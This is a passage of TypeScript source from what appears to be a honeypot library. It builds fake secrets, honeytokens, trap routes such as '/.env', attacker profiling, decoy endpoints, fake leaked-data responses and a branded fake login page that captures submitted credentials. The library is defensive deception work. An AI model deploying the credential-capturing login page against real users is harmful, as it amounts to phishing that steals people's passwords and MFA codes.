      { name: 'AWS_SECRET_ACCESS_KEY', value: randomHex(40), type: 'aws_secret_key' },
      { name: 'GITHUB_TOKEN', value: 'ghp_' + randomHex(36), type: 'github_token' },
      { name: 'STRIPE_SECRET_KEY', value: 'sk_live_' + randomHex(24), type: 'stripe_key' },
      { name: 'SENDGRID_API_KEY', value: 'SG.' + randomHex(22) + '.' + randomHex(22), type: 'sendgrid_key' },
      { name: 'DATABASE_PASSWORD', value: randomHex(24), type: 'password' },
      { name: 'JWT_SIGNING_KEY', value: randomHex(64), type: 'jwt_secret' },
      { name: 'SLACK_WEBHOOK_URL', value: 'https://hooks.slack.com/services/T' + randomHex(8) + '/B' + randomHex(8) + '/' + randomHex(24), type: 'webhook' },
    ];

    const mergedSecrets = [...defaultSecrets, ...secretsList];

    const secretHashes = mergedSecrets.map((s) => ({
      name: s.name,
      hash: createHash('sha256').update(s.value).digest('hex'),
      type: s.type,
    }));

    const service: FakeService = {
      id: generateId('secrets'),
      type: 'fake-secrets',
      port: 0,
      host: 'localhost',
      status: 'running',
      config: {
        secrets: secretHashes,
        rotationPolicy: {
          intervalMs: rotationPolicy.intervalMs ?? 86400000,
          autoRotate: rotationPolicy.autoRotate ?? true,
          notifyOnRotate: rotationPolicy.notifyOnRotate ?? true,
        },
        storage: 'encrypted-memory',
        auditLog: true,
      },
      metadata: {
        secretCount: mergedSecrets.length,
        types: [...new Set(mergedSecrets.map((s) => s.type ?? 'unknown'))],
        lastRotated: new Date(),
        nextRotation: new Date(Date.now() + (rotationPolicy.intervalMs ?? 86400000)),
      },
      startedAt: new Date(),
    };

    metrics.incCounter('honeypot.fakeSecrets.created');
    logger.info({ serviceId: service.id, secretCount: mergedSecrets.length }, 'Fake secrets created');
    span.end();
    return service;
  } catch (err) {
    span.end(err);
    metrics.incCounter('honeypot.fakeSecrets.error');
    logger.error(err, 'Failed to create fake secrets');
    throw new SecurityError('FAKE_SECRETS_FAILED', 'Failed to create fake secrets');
  }
}

// ─── 11. deceptiveRoutes ────────────────────────────────────────────────────

export interface DeceptiveRoutePattern {
  path: string;
  method?: string;
  trap?: boolean;
}

export interface DeceptiveRouteHandler {
  (req: unknown, res: unknown): void;
}

/**
 * @description Creates deceptive route patterns that look like legitimate API
 * endpoints but serve as traps to detect and track unauthorized access attempts.
 * @param routePatterns - Route pattern definitions
 * @param handlers - Custom handler functions for routes
 * @param detectionCallback - Callback invoked when a deceptive route is accessed
 * @returns RouteConfig with deceptive routes and detection middleware
 * @example
 * const routes = await deceptiveRoutes(
 *   [{ path: '/api/internal/users', trap: true }],
 *   {},
 *   (req, res) => console.log('Trap triggered')
 * );
 */
export async function deceptiveRoutes(
  routePatterns: DeceptiveRoutePattern[],
  handlers: Record<string, DeceptiveRouteHandler> = {},
  detectionCallback: (req: unknown, res: unknown) => void = () => {},
): Promise<RouteConfig> {
  const span = createSpan('honeypot.deceptiveRoutes');
  const metrics = getMetrics();

  try {
    const defaultPatterns: DeceptiveRoutePattern[] = [
      { path: '/api/internal/config', method: 'GET', trap: true },
      { path: '/api/admin/users', method: 'GET', trap: true },
      { path: '/api/v1/debug/vars', method: 'GET', trap: true },
      { path: '/.env', method: 'GET', trap: true },
      { path: '/api/backup/download', method: 'GET', trap: true },
      { path: '/graphql', method: 'POST', trap: true },
      { path: '/api/v1/auth/admin-token', method: 'POST', trap: true },
      { path: '/server-status', method: 'GET', trap: true },
      { path: '/api/internal/secrets', method: 'GET', trap: true },
      { path: '/wp-admin/', method: 'GET', trap: true },
      { path: '/phpmyadmin/', method: 'GET', trap: true },
      { path: '/api/v1/users/export', method: 'GET', trap: true },
    ];

    const mergedPatterns = [...defaultPatterns, ...routePatterns];

    const routes: DeceptiveRoute[] = mergedPatterns.map((pattern) => ({
      path: pattern.path,
      method: pattern.method ?? 'GET',
      handler: handlers[pattern.path] ?? ((req: unknown, res: unknown) => {
        detectionCallback(req, res);
        (res as Record<string, unknown>)['status'] = 404;
        (res as Record<string, unknown>)['body'] = { error: 'Not Found' };
      }),
      trap: pattern.trap ?? true,
    }));

    const routeConfig: RouteConfig = {
      routes,
      detectionCallback,
      middleware: [
        (req: unknown, res: unknown, next: () => void) => {
          const matchedRoute = routes.find((r) => {
            const path = (req as Record<string, unknown>)['path'] as string;
            return path === r.path;
          });
          if (matchedRoute) {
            detectionCallback(req, res);
            metrics.incCounter('honeypot.deceptiveRoute.triggered');
            logger.warn({ path: matchedRoute.path, method: matchedRoute.method }, 'Deceptive route accessed');
          }
          next();
        },
      ],
    };

    metrics.incCounter('honeypot.deceptiveRoutes.created');
    logger.info({ routeCount: routes.length, trapCount: routes.filter((r) => r.trap).length }, 'Deceptive routes created');
    span.end();
    return routeConfig;
  } catch (err) {
    span.end(err);
    metrics.incCounter('honeypot.deceptiveRoutes.error');
    logger.error(err, 'Failed to create deceptive routes');
    throw new SecurityError('DECEPTIVE_ROUTES_FAILED', 'Failed to create deceptive routes');
  }
}

// ─── 12. attackerBehaviorTracking ───────────────────────────────────────────

export interface BehaviorTimelineEntry {
  time: Date;
  event: string;
  details: string;
}

/**
 * @description Tracks and profiles attacker behavior by analyzing session actions
 * and building a timeline of activities to classify attack patterns.
 * @param sessionId - Unique session identifier
 * @param actions - List of attacker actions observed
 * @param timeline - Timeline entries for the session
 * @returns BehaviorProfile with risk score and technique classification
 * @example
 * const profile = await attackerBehaviorTracking(
 *   'sess-abc123',
 *   [{ type: 'login-attempt', target: '/admin', payload: 'admin:password123', timestamp: new Date(), result: 'failed' }],
 *   [{ time: new Date(), event: 'session-start', details: 'New connection from 1.2.3.4' }]
 * );
 */
export async function attackerBehaviorTracking(
  sessionId: string,
  actions: AttackerAction[],
  timeline: BehaviorTimelineEntry[],
): Promise<BehaviorProfile> {
  const span = createSpan('honeypot.attackerBehaviorTracking');
  const metrics = getMetrics();
  const eventBus = getEventBus();

  try {
    const techniqueMap: Record<string, string[]> = {
      'credential-stuffing': ['login-attempt', 'brute-force', 'password-spray'],
      'sql-injection': ['sql-injection', 'union-select', 'boolean-blind'],
      'xss': ['xss-reflected', 'xss-stored', 'dom-xss'],
      'path-traversal': ['directory-traversal', 'file-inclusion', 'path-manipulation'],
      'reconnaissance': ['port-scan', 'service-enumeration', 'version-detection'],
      'privilege-escalation': ['sudo-attempt', 'token-manipulation', 'role-change'],
      'data-exfiltration': ['data-export', 'bulk-download', 'api-scraping'],
    };

    const detectedTechniques: string[] = [];
    for (const [technique, actionTypes] of Object.entries(techniqueMap)) {
      if (actions.some((a) => actionTypes.includes(a.type))) {
        detectedTechniques.push(technique);
      }
    }

    const riskScore = clamp(
      Math.min(100, actions.length * 5 + detectedTechniques.length * 15 + timeline.length * 2),
      0,
      100,
    );

    const classification = riskScore > 80
      ? 'advanced-persistent-threat'
      : riskScore > 60
        ? 'automated-scanner'
        : riskScore > 40
          ? 'opportunistic-attacker'
          : 'reconnaissance';

    const profile: BehaviorProfile = {
      sessionId,
      ip: (actions[0] as Record<string, unknown>)?.['sourceIP'] as string ?? 'unknown',
      actions,
      timeline,
      riskScore,
      classification,
      techniques: detectedTechniques,
      firstSeen: timeline.length > 0 ? timeline[0].time : new Date(),
      lastSeen: timeline.length > 0 ? timeline[timeline.length - 1].time : new Date(),
    };

    metrics.incCounter('honeypot.attackerBehaviorTracking.profiled');
    metrics.setGauge('honeypot.attacker.riskScore', riskScore);
    eventBus.publish('honeypot:attacker-profile', {
      severity: riskScore > 60 ? EventSeverity.HIGH : EventSeverity.MEDIUM,
      data: { sessionId, riskScore, classification, techniques: detectedTechniques },
    } as SecurityEvent);

    logger.info(
      { sessionId, riskScore, classification, techniqueCount: detectedTechniques.length },
      'Attacker behavior profiled',
    );
    span.end();
    return profile;
  } catch (err) {
    span.end(err);
    metrics.incCounter('honeypot.attackerBehaviorTracking.error');
    logger.error(err, 'Failed to track attacker behavior');
    throw new SecurityError('ATTACKER_TRACKING_FAILED', 'Failed to track attacker behavior');
  }
}

// ─── 13. adaptiveDeception ──────────────────────────────────────────────────

export interface CurrentDeception {
  services: FakeService[];
  activeTraps: number;
  engagementScore: number;
}

export interface AttackerProfile {
  riskScore: number;
  techniques: string[];
  engagementLevel: 'low' | 'medium' | 'high';
}

export interface DeceptionEffectiveness {
  currentScore: number;
  engagementRate: number;
  detectionRate: number;
}

/**
 * @description Adapts deception strategy based on current deception setup,
 * attacker profile, and measured effectiveness to maximize engagement and detection.
 * @param currentDeception - Current deception configuration state
 * @param attackerProfile - Profile of the current attacker
 * @param effectiveness - Measured effectiveness metrics
 * @returns DeceptionStrategy with optimized services and rotation schedule
 * @example
 * const strategy = await adaptiveDeception(
 *   { services: [], activeTraps: 5, engagementScore: 0.3 },
 *   { riskScore: 75, techniques: ['sql-injection'], engagementLevel: 'high' },
 *   { currentScore: 0.6, engagementRate: 0.4, detectionRate: 0.8 }
 * );
 */
export async function adaptiveDeception(
  currentDeception: CurrentDeception,
  attackerProfile: AttackerProfile,
  effectiveness: DeceptionEffectiveness,
): Promise<DeceptionStrategy> {
  const span = createSpan('honeypot.adaptiveDeception');
  const metrics = getMetrics();

  try {
    const engagementLevel = attackerProfile.engagementLevel;
    const riskScore = attackerProfile.riskScore;

    const targetServiceCount = engagementLevel === 'high'
      ? Math.max(currentDeception.services.length + 2, 8)
      : engagementLevel === 'medium'
        ? Math.max(currentDeception.services.length + 1, 4)
        : currentDeception.services.length;

    const serviceTypes = ['fake-admin-panel', 'fake-api', 'fake-database', 'fake-ssh', 'fake-s3-bucket'];
    const adaptedServices: FakeService[] = [];

    for (let i = 0; i < targetServiceCount; i++) {
      const existing = currentDeception.services[i];
      adaptedServices.push(existing ?? {
        id: generateId('svc'),
        type: pickRandom(serviceTypes),
        port: randomPort(),
        host: randomIP(),
        status: 'running',
        config: { engagementLevel, riskScore },
        metadata: { adapted: true, index: i },
        startedAt: new Date(),
      });
    }

    const rotationSchedule: RotationEntry[] = adaptedServices.map((svc) => ({
      serviceId: svc.id,
      nextRotation: new Date(Date.now() + 300000 + Math.random() * 600000),
      newConfig: {
        ...svc.config,
        port: randomPort(),
        host: randomIP(),
      },
    }));

    const confidence = clamp(
      (effectiveness.detectionRate * 0.4 + effectiveness.engagementRate * 0.3 + (1 - currentDeception.engagementScore) * 0.3) * 100,
      0,
      100,
    );

    const strategy: DeceptionStrategy = {
      id: generateId('strat'),
      services: adaptedServices,
      rotationSchedule,
      effectiveness: effectiveness.currentScore,
      confidence,
      updatedAt: new Date(),
    };

    metrics.incCounter('honeypot.adaptiveDeception.updated');
    metrics.setGauge('honeypot.deception.confidence', confidence);
    logger.info(
      { strategyId: strategy.id, serviceCount: adaptedServices.length, confidence, engagementLevel },
      'Adaptive deception strategy updated',
    );
    span.end();
    return strategy;
  } catch (err) {
    span.end(err);
    metrics.incCounter('honeypot.adaptiveDeception.error');
    logger.error(err, 'Failed to adapt deception strategy');
    throw new SecurityError('ADAPTIVE_DECEPTION_FAILED', 'Failed to adapt deception strategy');
  }
}

// ─── 14. movingTargetDefense ────────────────────────────────────────────────

export interface MTDServiceConfig {
  name: string;
  originalPort: number;
  protocol?: string;
}

export interface MTDRandomization {
  portRange?: [number, number];
  jitterMs?: number;
  shuffleInterval?: number;
}

/**
 * @description Implements moving target defense by periodically rotating service
 * ports and configurations to increase attacker reconnaissance cost.
 * @param services - Services to protect with port rotation
 * @param rotationInterval - Milliseconds between rotations
 * @param randomization - Randomization parameters
 * @returns MTDConfig with active port mappings and rotation schedule
 * @example
 * const mtd = await movingTargetDefense(
 *   [{ name: 'web', originalPort: 80 }, { name: 'api', originalPort: 3000 }],
 *   300000,
 *   { portRange: [8000, 9000], jitterMs: 5000 }
 * );
 */
export async function movingTargetDefense(
  services: MTDServiceConfig[],
  rotationInterval: number = 300000,
  randomization: MTDRandomization = {},
): Promise<MTDConfig> {
  const span = createSpan('honeypot.movingTargetDefense');
  const metrics = getMetrics();
  const eventBus = getEventBus();

  try {
    const portRange = randomization.portRange ?? [8000, 9000];
    const jitter = randomization.jitterMs ?? 5000;

    const usedPorts = new Set<number>();
    const mtdServices: MTDService[] = services.map((svc) => {
      let newPort: number;
      do {
        newPort = randomPort(portRange[0], portRange[1]);
      } while (usedPorts.has(newPort));
      usedPorts.add(newPort);

      return {
        id: generateId('mtd'),
        name: svc.name,
        currentPort: newPort,
        originalPort: svc.originalPort,
        lastRotated: new Date(),
        nextRotation: new Date(Date.now() + rotationInterval + Math.random() * jitter),
      };
    });

    const activePorts = mtdServices.map((s) => s.currentPort);

    const config: MTDConfig = {
      id: generateId('mtd-config'),
      services: mtdServices,
      rotationIntervalMs: rotationInterval,
      randomizationFactor: jitter / rotationInterval,
      activePorts,
      updatedAt: new Date(),
    };

    metrics.incCounter('honeypot.movingTargetDefense.rotated');
    eventBus.publish('honeypot:mtd-rotation', {
      severity: EventSeverity.LOW,
      data: { configId: config.id, activePorts, serviceCount: mtdServices.length },
    } as SecurityEvent);

    logger.info(
      { configId: config.id, serviceCount: mtdServices.length, rotationIntervalMs: rotationInterval, activePorts },
      'Moving target defense configured',
    );
    span.end();
    return config;
  } catch (err) {
    span.end(err);
    metrics.incCounter('honeypot.movingTargetDefense.error');
    logger.error(err, 'Failed to configure moving target defense');
    throw new SecurityError('MTD_FAILED', 'Failed to configure moving target defense');
  }
}

// ─── 15. honeytokenGeneration ───────────────────────────────────────────────

export interface HoneytokenMetadata {
  name?: string;
  environment?: string;
  owner?: string;
  tags?: string[];
}

export interface HoneytokenTracking {
  endpoint: string;
  alertEmail?: string;
  webhookUrl?: string;
  logLevel?: 'info' | 'warn' | 'error';
}

/**
 * @description Generates a honeytoken (canary token) that can be embedded in
 * code, configs, or documents to detect unauthorized access when used.
 * @param tokenType - Type of honeytoken (api-key, aws-key, jwt, url, etc.)
 * @param metadata - Metadata to associate with the token
 * @param tracking - Tracking and alert configuration
 * @returns Honeytoken with value, hash, and tracking config
 * @example
 * const token = await honeytokenGeneration(
 *   'api-key',
 *   { name: 'prod-api-key', environment: 'production' },
 *   { endpoint: '/api/honeytoken/trigger', alertEmail: 'security@example.com' }
 * );
 */
export async function honeytokenGeneration(
  tokenType: string,
  metadata: HoneytokenMetadata = {},
  tracking: HoneytokenTracking,
): Promise<Honeytoken> {
  const span = createSpan('honeypot.honeytokenGeneration');
  const metrics = getMetrics();
  const eventBus = getEventBus();

  try {
    let value: string;
    const id = generateId('ht');

    switch (tokenType) {
      case 'api-key':
        value = 'sk-honey-' + randomHex(32);
        break;
      case 'aws-key':
        value = 'AKIA' + randomHex(16);
        break;
      case 'aws-secret':
        value = randomHex(40);
        break;
      case 'jwt':
        value = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.' + randomHex(48) + '.' + randomHex(43);
        break;
      case 'github-token':
        value = 'ghp_' + randomHex(36);
        break;
      case 'stripe-key':
        value = 'sk_live_' + randomHex(24);
        break;
      case 'url':
        value = 'https://canary.example.com/track/' + randomHex(32);
        break;
      case 'email':
        value = 'canary-' + randomHex(16) + '@canary.example.com';
        break;
      case 'password':
        value = 'H0n3y!' + randomHex(12) + '@P4ss';
        break;
      default:
        value = 'honey-' + tokenType + '-' + randomHex(32);
    }

    const hashBuffer = sha3_256(new TextEncoder().encode(value));
    const hash = Array.from(hashBuffer).map((b) => b.toString(16).padStart(2, '0')).join('');

    const honeytoken: Honeytoken = {
      id,
      type: tokenType,
      value,
      hash,
      metadata: {
        name: metadata.name ?? 'honeytoken-' + id,
        environment: metadata.environment ?? 'unknown',
        owner: metadata.owner ?? 'security-team',
        tags: metadata.tags ?? [],
        generatedAt: new Date().toISOString(),
      },
      tracking: {
        endpoint: tracking.endpoint,
        alertEmail: tracking.alertEmail,
        webhookUrl: tracking.webhookUrl,
        logLevel: tracking.logLevel ?? 'warn',
      },
      createdAt: new Date(),
      status: 'active',
    };

    metrics.incCounter('honeypot.honeytoken.generated');
    eventBus.publish('honeypot:honeytoken-created', {
      severity: EventSeverity.LOW,
      data: { id, type: tokenType, environment: metadata.environment },
    } as SecurityEvent);

    logger.info({ tokenId: id, type: tokenType, environment: metadata.environment }, 'Honeytoken generated');
    span.end();
    return honeytoken;
  } catch (err) {
    span.end(err);
    metrics.incCounter('honeypot.honeytoken.error');
    logger.error(err, 'Failed to generate honeytoken');
    throw new SecurityError('HONEYTOKEN_FAILED', 'Failed to generate honeytoken');
  }
}

// ─── 16. honeycredentialDetection ───────────────────────────────────────────

export interface HoneycredentialEntry {
  credential: string;
  source: string;
  tokenHash?: string;
}

export interface HoneytokenDatabase {
  hashes: Record<string, string>;
  tokens: Record<string, Honeytoken>;
}

/**
 * @description Detects if provided credentials match any known honeytokens
 * by comparing against the honeytoken database to identify credential leaks.
 * @param credentials - List of credentials to check
 * @param honeytokenDb - Database of known honeytoken hashes
 * @returns DetectionResult with matches and risk assessment
 * @example
 * const result = await honeycredentialDetection(
 *   ['sk-honey-abc123', 'AKIA1234567890ABCDEF'],
 *   { hashes: { 'abc': 'hash123' }, tokens: {} }
 * );
 */
export async function honeycredentialDetection(
  credentials: string[],
  honeytokenDb: HoneytokenDatabase,
): Promise<DetectionResult> {
  const span = createSpan('honeypot.honeycredentialDetection');
  const metrics = getMetrics();
  const eventBus = getEventBus();

  try {
    const matches: CredentialMatch[] = [];

    for (const cred of credentials) {
      const credHash = createHash('sha256').update(cred).digest('hex');
      const credSha3Buffer = sha3_256(new TextEncoder().encode(cred));
      const credSha3 = Array.from(credSha3Buffer).map((b) => b.toString(16).padStart(2, '0')).join('');

      const matchedEntry = Object.entries(honeytokenDb.hashes).find(
        ([, hash]) => hash === credHash || hash === credSha3,
      );

      if (matchedEntry) {
        const [tokenKey] = matchedEntry;
        const token = honeytokenDb.tokens[tokenKey];
        const severity = token?.metadata?.environment === 'production' ? 'critical' : 'high';

        matches.push({
          credential: cred.substring(0, 8) + '...' + cred.substring(cred.length - 4),
          source: token?.metadata?.name ?? 'unknown',
          matchedToken: tokenKey,
          severity,
        });
      }
    }

    const riskScore = clamp(matches.length * 25 + matches.filter((m) => m.severity === 'critical').length * 25, 0, 100);
    const detected = matches.length > 0;

    const recommendation = detected
      ? matches.some((m) => m.severity === 'critical')
        ? 'CRITICAL: Production honeytoken detected. Assume full credential compromise. Initiate incident response immediately.'
        : 'WARNING: Honeytoken credentials detected in the wild. Review exposure scope and rotate related credentials.'
      : 'No honeytoken matches found. Credentials appear clean.';

    const result: DetectionResult = {
      detected,
      matches,
      riskScore,
      timestamp: new Date(),
      recommendation,
    };

    if (detected) {
      metrics.incCounter('honeypot.honeycredential.detected');
      eventBus.publish('honeypot:honeycredential-alert', {
        severity: matches.some((m) => m.severity === 'critical') ? EventSeverity.CRITICAL : EventSeverity.HIGH,
        data: { matchCount: matches.length, riskScore, matches: matches.map((m) => m.source) },
      } as SecurityEvent);
    }

    metrics.incCounter('honeypot.honeycredential.checked');
    logger.info(
      { checked: credentials.length, detected: matches.length, riskScore },
      'Honeycredential detection completed',
    );
    span.end();
    return result;
  } catch (err) {
    span.end(err);
    metrics.incCounter('honeypot.honeycredential.error');
    logger.error(err, 'Failed to detect honeycredentials');
    throw new SecurityError('HONEYCREDENTIAL_DETECTION_FAILED', 'Failed to detect honeycredentials');
  }
}

// ─── 17. decoyEndpoints ─────────────────────────────────────────────────────

/**
 * @description Generates an array of decoy endpoint paths that look like
 * legitimate API routes to waste attacker time and trigger alerts on access.
 * @param basePath - Base path prefix for all decoy endpoints
 * @param count - Number of decoy endpoints to generate
 * @param patterns - Custom pattern templates to use
 * @returns Array of decoy endpoint path strings
 * @example
 * const endpoints = await decoyEndpoints('/api/v2', 10, ['/internal/:resource']);
 */
export async function decoyEndpoints(
  basePath: string = '/api',
  count: number = 10,
  patterns: string[] = [],
): Promise<string[]> {
  const span = createSpan('honeypot.decoyEndpoints');
  const metrics = getMetrics();

  try {
    const defaultPatterns = [
      '/internal/:resource',
      '/admin/:action',
      '/debug/:endpoint',
      '/config/:section',
      '/backup/:filename',
      '/metrics/:type',
      '/health/:check',
      '/status/:service',
      '/api/:version/:resource',
      '/webhook/:provider',
      '/callback/:service',
      '/oauth/:action',
      '/auth/:provider/callback',
      '/v:version/:resource/:id',
      '/internal/metrics/:type',
    ];

    const mergedPatterns = [...defaultPatterns, ...patterns];
    const resources = ['users', 'config', 'secrets', 'tokens', 'sessions', 'logs', 'keys', 'certificates', 'databases', 'backups'];
    const actions = ['list', 'create', 'delete', 'export', 'import', 'sync', 'rotate', 'reset'];
    const versions = ['1', '2', '3', 'v1', 'v2'];
    const providers = ['github', 'google', 'okta', 'auth0', 'azure-ad'];
    const services = ['auth', 'payments', 'notifications', 'analytics', 'monitoring'];

    const endpoints = new Set<string>();

    while (endpoints.size < count) {
      const pattern = pickRandom(mergedPatterns);
      let endpoint = basePath + pattern;

      endpoint = endpoint.replace(':resource', pickRandom(resources));
      endpoint = endpoint.replace(':action', pickRandom(actions));
      endpoint = endpoint.replace(':endpoint', pickRandom(['vars', 'pprof', 'trace', 'heap']));
      endpoint = endpoint.replace(':section', pickRandom(['database', 'cache', 'auth', 'logging']));
      endpoint = endpoint.replace(':filename', pickRandom(['dump.sql', 'backup.tar.gz', 'config.yml', 'secrets.json']));
      endpoint = endpoint.replace(':type', pickRandom(['cpu', 'memory', 'disk', 'network']));
      endpoint = endpoint.replace(':check', pickRandom(['deep', 'ready', 'live']));
      endpoint = endpoint.replace(':service', pickRandom(services));
      endpoint = endpoint.replace(':version', pickRandom(versions));
      endpoint = endpoint.replace(':id', String(Math.floor(Math.random() * 10000)));
      endpoint = endpoint.replace(':provider', pickRandom(providers));

      endpoints.add(endpoint);
    }

    const result = Array.from(endpoints).slice(0, count);

    metrics.incCounter('honeypot.decoyEndpoints.generated');
    metrics.setGauge('honeypot.decoyEndpoints.count', result.length);
    logger.info({ basePath, count: result.length }, 'Decoy endpoints generated');
    span.end();
    return result;
  } catch (err) {
    span.end(err);
    metrics.incCounter('honeypot.decoyEndpoints.error');
    logger.error(err, 'Failed to generate decoy endpoints');
    throw new SecurityError('DECOY_ENDPOINTS_FAILED', 'Failed to generate decoy endpoints');
  }
}

// ─── 18. deceptiveResponses ─────────────────────────────────────────────────

export interface DeceptiveResponseConfig {
  delayMs?: number;
  statusCode?: number;
  includeHeaders?: boolean;
  leakFakeData?: boolean;
}

export interface AttackerDeceptionProfile {
  riskScore: number;
  techniques: string[];
  engagementLevel: string;
}

/**
 * @description Generates deceptive HTTP responses tailored to the attacker's
 * profile to maximize engagement time while leaking controlled fake data.
 * @param request - Incoming request object
 * @param deceptionConfig - Deception response configuration
 * @param attackerProfile - Profile of the requesting attacker
 * @returns Response object with deceptive content
 * @example
 * const response = await deceptiveResponses(
 *   { path: '/api/admin/users', method: 'GET', headers: {} },
 *   { delayMs: 200, includeHeaders: true, leakFakeData: true },
 *   { riskScore: 65, techniques: ['sql-injection'], engagementLevel: 'medium' }
 * );
 */
export async function deceptiveResponses(
  request: Record<string, unknown>,
  deceptionConfig: DeceptiveResponseConfig = {},
  attackerProfile: AttackerDeceptionProfile = { riskScore: 0, techniques: [], engagementLevel: 'low' },
): Promise<Record<string, unknown>> {
  const span = createSpan('honeypot.deceptiveResponses');
  const metrics = getMetrics();

  try {
    const delay = deceptionConfig.delayMs ?? Math.floor(Math.random() * 500);
    const statusCode = deceptionConfig.statusCode ?? 200;
    const includeHeaders = deceptionConfig.includeHeaders ?? true;
    const leakFakeData = deceptionConfig.leakFakeData ?? true;

    const fakeUsers = [
      { id: 1, username: 'admin', email: 'admin@company.com', role: 'superadmin', lastLogin: '2024-12-01T10:30:00Z' },
      { id: 2, username: 'dbadmin', email: 'dba@company.com', role: 'dba', lastLogin: '2024-11-28T14:22:00Z' },
      { id: 3, username: 'svc_deploy', email: 'deploy@internal', role: 'service', lastLogin: '2024-12-02T03:00:00Z' },
    ];

    const fakeConfig = {
      database: { host: 'db-primary.internal', port: 5432, name: 'production', pool_size: 20 },
      cache: { host: 'redis.internal', port: 6379, ttl: 3600 },
      auth: { jwt_secret: 'hs256-secret-' + randomHex(16), token_expiry: 3600, refresh_expiry: 86400 },
      features: { mfa: true, sso: true, api_rate_limit: 1000 },
    };

    const fakeSecrets = [
      { name: 'AWS_ACCESS_KEY_ID', value: 'AKIA' + randomHex(16), lastRotated: '2024-10-01' },
      { name: 'DATABASE_PASSWORD', value: 'P@ss' + randomHex(8) + '!', lastRotated: '2024-11-15' },
      { name: 'API_SECRET', value: 'secret_' + randomHex(24), lastRotated: '2024-12-01' },
    ];

    let body: Record<string, unknown>;
    const path = (request.path as string) ?? '';

    if (path.includes('user')) {
      body = { users: fakeUsers, total: fakeUsers.length, page: 1 };
    } else if (path.includes('config') || path.includes('settings')) {
      body = { config: fakeConfig, version: '2.1.0', lastUpdated: '2024-12-01' };
    } else if (path.includes('secret') || path.includes('key') || path.includes('token')) {
      body = { secrets: fakeSecrets, count: fakeSecrets.length };
    } else if (path.includes('backup') || path.includes('dump')) {
      body = { backups: [{ id: 1, filename: 'db-backup-2024-12-01.sql.gz', size: '52MB', created: '2024-12-01T03:00:00Z' }] };
    } else if (path.includes('login') || path.includes('auth')) {
      body = { token: 'eyJhbGciOiJIUzI1NiJ9.' + randomHex(48) + '.' + randomHex(43), expires_in: 3600, user: { id: 1, role: 'admin' } };
    } else {
      body = { status: 'ok', server: 'production-api-01', version: '2.1.0', timestamp: new Date().toISOString() };
    }

    const response: Record<string, unknown> = {
      statusCode,
      headers: includeHeaders
        ? {
            'Content-Type': 'application/json',
            'X-Request-Id': randomHex(16),
            'X-Server': 'api-prod-01',
            'X-RateLimit-Remaining': String(Math.floor(Math.random() * 1000)),
            'X-Response-Time': delay + 'ms',
            'Server': 'nginx/1.24.0',
          }
        : {},
      body: leakFakeData ? body : { error: 'Not Found' },
      delay,
      metadata: {
        deceptive: true,
        attackerRiskScore: attackerProfile.riskScore,
        techniques: attackerProfile.techniques,
      },
    };

    metrics.incCounter('honeypot.deceptiveResponses.generated');
    logger.debug({ path, statusCode, delay }, 'Deceptive response generated');
    span.end();
    return response;
  } catch (err) {
    span.end(err);
    metrics.incCounter('honeypot.deceptiveResponses.error');
    logger.error(err, 'Failed to generate deceptive response');
    throw new SecurityError('DECEPTIVE_RESPONSE_FAILED', 'Failed to generate deceptive response');
  }
}

// ─── 19. fakeLoginPage ──────────────────────────────────────────────────────

export interface FakeLoginTemplate {
  framework?: string;
  layout?: string;
}

export interface FakeLoginBranding {
  companyName?: string;
  logoUrl?: string;
  primaryColor?: string;
  favicon?: string;
}

/**
 * @description Creates a fake login page service with realistic branding,
 * form handling, and tracking to capture credential submission attempts.
 * @param template - Page template configuration
 * @param branding - Branding elements for the login page
 * @param trackingScript - Optional tracking/analytics script URL
 * @returns FakeService representing the fake login page
 * @example
 * const loginPage = await fakeLoginPage(
 *   { framework: 'nextjs', layout: 'centered' },
 *   { companyName: 'Acme Corp', primaryColor: '#1a73e8' },
 *   '/js/tracking.js'
 * );
 */
export async function fakeLoginPage(
  template: FakeLoginTemplate = {},
  branding: FakeLoginBranding = {},
  trackingScript: string = '',
): Promise<FakeService> {
  const span = createSpan('honeypot.fakeLoginPage');
  const metrics = getMetrics();

  try {
    const companyName = branding.companyName ?? 'Enterprise Portal';
    const primaryColor = branding.primaryColor ?? '#1a73e8';
    const framework = template.framework ?? 'react';
    const layout = template.layout ?? 'centered';

    const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>${companyName} - Login</title>
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
    .login-container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 100%; max-width: 400px; }
    .logo { text-align: center; margin-bottom: 24px; }
    .logo h1 { color: ${primaryColor}; font-size: 24px; margin: 0; }
    .form-group { margin-bottom: 16px; }
    .form-group label { display: block; margin-bottom: 4px; font-weight: 500; color: #333; }
    .form-group input { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; box-sizing: border-box; }
    .form-group input:focus { outline: none; border-color: ${primaryColor}; box-shadow: 0 0 0 2px ${primaryColor}33; }
    .btn { width: 100%; padding: 12px; background: ${primaryColor}; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
    .btn:hover { opacity: 0.9; }
    .footer { text-align: center; margin-top: 16px; font-size: 12px; color: #888; }
  </style>
  ${trackingScript ? '<script src="' + trackingScript + '"></script>' : ''}
</head>
<body>
  <div class="login-container">
    <div class="logo"><h1>${companyName}</h1></div>
    <form action="/auth/login" method="POST" id="loginForm">
      <div class="form-group">
        <label for="email">Email</label>
        <input type="email" id="email" name="email" placeholder="you@company.com" required autocomplete="email">
      </div>
      <div class="form-group">
        <label for="password">Password</label>
        <input type="password" id="password" name="password" placeholder="Enter your password" required autocomplete="current-password">
      </div>
      <div class="form-group">
        <label for="mfa">MFA Code (if enabled)</label>
        <input type="text" id="mfa" name="mfa" placeholder="123456" maxlength="6" autocomplete="one-time-code">
      </div>
      <button type="submit" class="btn">Sign In</button>
    </form>
    <div class="footer">&copy; ${new Date().getFullYear()} ${companyName}. All rights reserved.</div>
  </div>
</body>
</html>`;

    const service: FakeService = {
      id: generateId('login'),
      type: 'fake-login-page',
      port: randomPort(8000, 9000),
      host: '0.0.0.0',
      status: 'running',
      config: {
        framework,
        layout,
        html,
        branding: {
          companyName,
          logoUrl: branding.logoUrl,
          primaryColor,
          favicon: branding.favicon,
        },
        trackingScript,
        formFields: ['email', 'password', 'mfa'],
        csrfToken: randomHex(32),
        sessionTimeout: 1800,
      },
      metadata: {
